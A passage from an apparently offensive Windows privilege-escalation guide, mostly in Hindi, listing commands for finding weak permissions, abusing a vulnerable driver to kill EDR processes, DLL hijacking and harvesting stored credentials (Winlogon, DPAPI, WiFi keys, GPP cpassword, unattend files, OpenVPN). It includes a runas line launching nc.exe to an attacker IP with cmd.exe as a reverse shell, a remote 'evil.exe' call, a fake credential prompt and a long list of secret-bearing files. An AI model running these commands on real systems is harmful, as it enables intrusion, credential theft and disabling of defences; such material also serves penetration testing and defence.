Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि किसी service के fail होने पर कौन‑सी actions ली जाएँ। इस feature को किसी binary की ओर point करने के लिए configure किया जा सकता है। यदि यह binary replaceable है, तो privilege escalation संभव हो सकता है। अधिक विवरण के लिए देखें [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## एप्लिकेशन

### इंस्टॉल किए गए एप्लिकेशन

जाँचें **permissions of the binaries** (शायद आप किसी को overwrite करके privileges escalate कर सकें) और **folders** की permissions ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ

जाँचें कि क्या आप किसी config file को संशोधित कर सकते हैं ताकि किसी विशेष फ़ाइल को पढ़ा जा सके, या क्या आप किसी binary को संशोधित कर सकते हैं जिसे Administrator account (schedtasks) द्वारा चलाया जाएगा।

सिस्टम में कमजोर folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएँ

**जाँच करें कि क्या आप किसी registry या binary को ओवरराइट कर सकते हैं जो किसी अलग उपयोगकर्ता द्वारा execute किया जाएगा।**\
**Read** उस **निम्नलिखित पृष्ठ** को पढ़ें ताकि आप रोचक **autoruns locations to escalate privileges** के बारे में और जान सकें:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ड्राइवर्स

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई ड्राइवर arbitrary kernel read/write primitive प्रदर्शित करता है (अक्सर poorly designed IOCTL handlers में), आप सीधे kernel memory से एक SYSTEM token चुरा कर privilege escalate कर सकते हैं। स्टेप‑बाय‑स्टेप तकनीक यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### device objects पर FILE_DEVICE_SECURE_OPEN की कमी का दुरुपयोग (LPE + EDR kill)

कुछ signed third‑party drivers अपने device object को मजबूत SDDL के साथ IoCreateDeviceSecure के जरिए बनाते हैं लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, secure DACL उस समय लागू नहीं होता जब डिवाइस को ऐसे path से खोला जाता है जिसमें एक अतिरिक्त component हो, जिससे कोई भी unprivileged user निम्नलिखित namespace path का उपयोग करके handle प्राप्त कर सकता है:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

एक बार user device को खोल सके, driver द्वारा expose किए गए privileged IOCTLs का दुरुपयोग LPE और tampering के लिए किया जा सकता है। वास्तविक दुनिया में देखी गई उदाहरण क्षमताएँ:
- arbitrary processes को full-access handles वापस करना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- अनियंत्रित raw disk read/write (offline tampering, boot-time persistence tricks).
- arbitrary processes को terminate करना, जिनमें Protected Process/Light (PP/PPL) शामिल हैं, जिससे user land से kernel के माध्यम से AV/EDR kill संभव हो जाता है.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- जब आप ऐसे device objects बनाते हैं जिन्हें DACL द्वारा सीमित किया जाना है तो हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- privileged operations के लिए caller context को validate करें। process termination या handle returns की अनुमति देने से पहले PP/PPL चेक जोड़ें।
- IOCTLs (access masks, METHOD_*, input validation) को सीमित करें और सीधे kernel privileges के बजाय brokered models पर विचार करें।

Detection ideas for defenders
- संदिग्ध device names (e.g., \\ .\\amsdk*) की user-mode opens और दुरुपयोग का संकेत देने वाली विशिष्ट IOCTL sequences की निगरानी करें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी खुद की allow/deny lists बनाए रखें।


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग कैसे करें, इसके बारे में अधिक जानकारी के लिए:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में hardcoded अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफ़ेस और DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट

बाहरी से **प्रतिबंधित सेवाएँ** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग टेबल
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(रूल सूचीबद्ध करना, रूल बनाना, बंद करना, बंद करना...)**

अधिक[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है

यदि आप root user प्राप्त कर लेते हैं तो आप किसी भी पोर्ट पर सुन सकते हैं (पहली बार जब आप किसी पोर्ट पर सुनने के लिए `nc.exe` का उपयोग करेंगे, तो यह GUI के माध्यम से पूछेगा कि `nc` को firewall द्वारा अनुमति दी जानी चाहिए या नहीं)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
रूट के रूप में bash आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं

आप `WSL` filesystem को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault सर्वरों, वेबसाइटों और अन्य प्रोग्रामों के लिए उपयोगकर्ता क्रेडेंशियल्स को स्टोर करता है जिन्हें **Windows** **स्वचालित रूप से उपयोगकर्ताओं को लॉग इन** करवा सकता है। पहली नज़र में ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook, Twitter, Gmail आदि के क्रेडेंशियल्स यहाँ स्टोर कर सकते हैं ताकि वे ब्राउज़र के माध्यम से स्वतः लॉग इन हो जाएँ। लेकिन ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को स्टोर करता है जिनके द्वारा Windows उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर सकता है, जिसका मतलब है कि कोई भी **Windows application जो किसी resource तक पहुँचने के लिए credentials की आवश्यकता रखता है** (server या a website) **इस Credential Manager का उपयोग कर सकता है** & Windows Vault और उपयोगकर्ताओं द्वारा बार-बार username और password डालने के बजाय उपलब्ध कराए गए क्रेडेंशियल्स का उपयोग कर सकता है।

जब तक एप्लिकेशन Credential Manager के साथ इंटरैक्ट नहीं करते, मुझे नहीं लगता कि वे किसी दिए गए resource के लिए क्रेडेंशियल्स का उपयोग कर पाएंगे। इसलिए, यदि आपका एप्लिकेशन vault का उपयोग करना चाहता है, तो इसे किसी न किसी तरह से डिफ़ॉल्ट storage vault से **credential manager के साथ संवाद करके उस resource के लिए credentials का अनुरोध** करना चाहिए।

मशीन पर संग्रहीत क्रेडेंशियल्स की सूची देखने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए credentials का उपयोग करने के लिए `runas` को `/savecred` विकल्प के साथ चला सकते हैं। निम्नलिखित उदाहरण SMB share के माध्यम से रिमोट binary को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential सेट के साथ `runas` का उपयोग।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note करें कि ये क्रेडेंशियल्स mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से निकाले जा सकते हैं।

### DPAPI

The **Data Protection API (DPAPI)** डेटा के सममित एन्क्रिप्शन के लिए एक तरीका प्रदान करता है, जिसका उपयोग मुख्यतः Windows ऑपरेटिंग सिस्टम के भीतर असिमेट्रिक प्राइवेट कीज़ के सममित एन्क्रिप्शन के लिए किया जाता है। यह एन्क्रिप्शन एंट्रॉपी में महत्वपूर्ण योगदान देने के लिए उपयोगकर्ता या सिस्टम सीक्रेट का उपयोग करता है।

**DPAPI उपयोगकर्ता के लॉगिन सीक्रेट्स से व्युत्पन्न एक symmetric key के माध्यम से कुंजियों के एन्क्रिप्शन को सक्षम करता है**। सिस्टम-एन्क्रिप्शन की परिस्थितियों में, यह सिस्टम के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके encrypted user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` डायरेक्टरी में संग्रहीत होते हैं, जहाँ `{SID}` उपयोगकर्ता के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) का प्रतिनिधित्व करता है। **DPAPI key, जो उसी फ़ाइल में उपयोगकर्ता की private keys की सुरक्षा करने वाले master key के साथ सह-स्थित होती है,** आमतौर पर 64 bytes की random data होती है। (यह ध्यान देने योग्य है कि इस डायरेक्टरी तक पहुँच restricted है, इसलिए CMD में `dir` कमांड द्वारा इसकी सामग्री सूचीबद्ध नहीं की जा सकती, हालाँकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप उपयुक्त arguments (`/pvk` or `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग करके इसे decrypt कर सकते हैं।

आम तौर पर **master password द्वारा सुरक्षित credentials फ़ाइलें** निम्न स्थानों पर स्थित होती हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell क्रेडेंशियल्स

**PowerShell क्रेडेंशियल्स** का अक्सर उपयोग **scripting** और automation tasks के लिए किया जाता है ताकि encrypted credentials को सुविधाजनक तरीके से store किया जा सके। ये credentials **DPAPI** द्वारा सुरक्षित होते हैं, जिसका सामान्यतः मतलब है कि इन्हें केवल वही user और वही computer ही decrypt कर सकता है जिन पर इन्हें बनाया गया था।

फाइल में मौजूद PS credentials को **decrypt** करने के लिए आप यह कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### वाईफ़ाई
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
आप उपयुक्त `/masterkey` के साथ **Mimikatz** `dpapi::rdg` मॉड्यूल का उपयोग करके किसी भी `.rdg` फाइल को **decrypt** कर सकते हैं।\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module  
आप मेमोरी से कई **DPAPI masterkeys** को **extract** करने के लिए **Mimikatz** `sekurlsa::dpapi` मॉड्यूल का उपयोग कर सकते हैं।

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.  
लोग अक्सर Windows वर्कस्टेशनों पर StickyNotes ऐप का उपयोग **save passwords** और अन्य जानकारी सहेजने के लिए करते हैं, यह समझे बिना कि यह एक database file है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` में स्थित है और हमेशा इसे खोजकर और जांचने लायक होता है।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** कॉन्फ़िगर किए गए हों और उन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जांचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर **SYSTEM privileges के साथ चलाए जाते हैं**, और कई **DLL Sideloading (जानकारी** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys रजिस्ट्री में

SSH private keys रजिस्ट्री key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर स्टोर हो सकते हैं, इसलिए आपको जांचना चाहिए कि वहाँ कुछ दिलचस्प है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस पथ के अंदर कोई एंट्री मिलती है तो वह संभवतः एक saved SSH key होगी। यह encrypted रूप में संग्रहीत है लेकिन इसे आसानी से decrypted किया जा सकता है using [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
इस तकनीक के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` सर्विस चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वतः शुरू हो, तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह technique अब मान्य नहीं है। मैंने कुछ ssh keys बनाए, उन्हें `ssh-add` से जोड़ा और ssh के माध्यम से एक मशीन में login किया। रेजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### बिना देखरेख वाली फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल खोजें जिसका नाम **SiteList.xml** हो

### Cached GPP Pasword

एक फीचर पहले मौजूद था जो Group Policy Preferences (GPP) के माध्यम से मशीनों के समूह पर कस्टम लोकल administrator खाते डिप्लॉय करने की अनुमति देता था। हालांकि, इस विधि में महत्वपूर्ण सुरक्षा कमजोरियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में स्टोर होते हैं, किसी भी डोमेन उपयोगकर्ता द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs के भीतर के passwords, जो AES256 से एन्क्रिप्टेड थे और एक publicly documented default key का उपयोग करते थे, किसी भी प्रमाणीकृत उपयोगकर्ता द्वारा डीक्रिप्ट किए जा सकते थे। यह एक गंभीर जोखिम था, क्योंकि इससे users को elevated privileges मिल सकते थे।

इस जोखिम को कम करने के लिए, एक फ़ंक्शन विकसित किया गया था जो स्थानीय रूप से cached GPP फ़ाइलों को स्कैन करता है जिनमें एक "cpassword" field होता है जो खाली नहीं है। ऐसी फ़ाइल मिलने पर, फ़ंक्शन password को decrypt करता है और एक custom PowerShell object लौटाता है। यह object GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जो इस सुरक्षा कमजोरी की पहचान और निवारण में मदद करता है।

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके passwords प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
web.config के साथ credentials का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल्स
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials के लिए पूछें

यदि आपको लगता है कि वह उन्हें जान सकता है, तो आप हमेशा **उपयोगकर्ता से उसके credentials दर्ज करने के लिए कह सकते हैं या यहाँ तक कि किसी अन्य उपयोगकर्ता के credentials भी माँग सकते हैं** (ध्यान दें कि क्लाइंट से सीधे **credentials** माँगना वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइल नाम जिनमें credentials शामिल हो सकते हैं**

ज्ञात फ़ाइलें जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में मौजूद थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
